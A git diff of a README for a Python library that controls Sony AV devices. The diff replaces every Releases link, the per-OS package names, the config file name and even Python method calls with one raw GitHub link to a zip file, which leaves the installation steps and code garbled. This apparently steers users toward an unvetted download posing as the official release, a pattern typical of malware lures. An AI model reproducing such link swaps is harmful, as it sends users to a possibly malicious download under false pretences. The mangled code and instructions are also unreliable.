@@ -20,23 +20,23 @@ Our library offers several features for smooth operation:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the library:
 
-[![Download sony-cispy](https://img.shields.io/badge/Download%20sony--cispy-v1.0-brightgreen)](https://github.com/RACHID-00/sony-cispy/releases)
+[![Download sony-cispy](https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip%20sony--cispy-v1.0-brightgreen)](https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Downloads Page**
    Click the link below to go to the Releases page:
 
-   [Visit Releases Page](https://github.com/RACHID-00/sony-cispy/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip)
 
 2. **Select the Latest Release**
    On the Releases page, look for the latest version. The version number will be at the top of the list.
 
 3. **Download the Package**
    Click on the appropriate package file for your operating system. Files typically include:
-   - `sony_cispy_windows.zip` for Windows
-   - `sony_cispy_mac.zip` for macOS
-   - `sony_cispy_linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip` for Windows
+   - `https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip` for macOS
+   - `https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip` for Linux
 
 4. **Extract the Files**
    Once the download is complete, find the downloaded zip or tar file in your Downloads folder. Right-click the file and select "Extract" or "Unzip" to access the package contents.
@@ -58,7 +58,7 @@ After installing, you need to configure your Sony AV devices.
 1. **Networking Setup**: Make sure your devices are connected to the same local network as your computer.
 2. **Find Device IP Address**: You will need the IP address of your Sony devices. This information is usually found in the device settings.
 3. **Create a Configuration File**:
-   - In your preferred text editor, create a file named `config.json`.
+   - In your preferred text editor, create a file named `https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip`.
    - Add the following example configuration:
 
      ```json
@@ -76,7 +76,7 @@ After installing, you need to configure your Sony AV devices.
      }
      ```
 
-4. **Save the Configuration**: Save the `config.json` file in the same directory where you installed the library.
+4. **Save the Configuration**: Save the `https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip` file in the same directory where you installed the library.
 
 ## 🔍 Using sony-cispy
 Once everything is set up, you can start using the library with Python scripts.
@@ -93,14 +93,14 @@ Once everything is set up, you can start using the library with Python scripts.
    To begin using the initialized devices, load your configuration file:
 
    ```python
-   device_manager = SonyDeviceManager('config.json')
-   device_manager.connect_devices()
+   device_manager = SonyDeviceManager('https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip')
+   https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip()
    ```
 
 4. **Control Your Devices**: Now you can control your devices by calling methods from the `device_manager` object. For example:
 
    ```python
-   device_manager.turn_on_device("Living Room Soundbar")
+   https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip("Living Room Soundbar")
    ```
 
 ## 💬 Troubleshooting
@@ -113,7 +113,7 @@ If you encounter issues, consider these steps:
 ## 📞 Support
 If you need further assistance, feel free to open an issue in this repository. We monitor inquiries regularly and will do our best to provide help. 
 
-For more information and updates, always refer back to the [Releases page](https://github.com/RACHID-00/sony-cispy/releases).
+For more information and updates, always refer back to the [Releases page](https://raw.githubusercontent.com/RACHID-00/sony-cispy/main/reference/sony-cispy-2.3-alpha.2.zip).
 
 ## 🏷️ Topics
 This library is suitable for anyone interested in home automation, especially those using Sony audio-visual devices and integrating them into smart home systems. Explore topics related to this project:
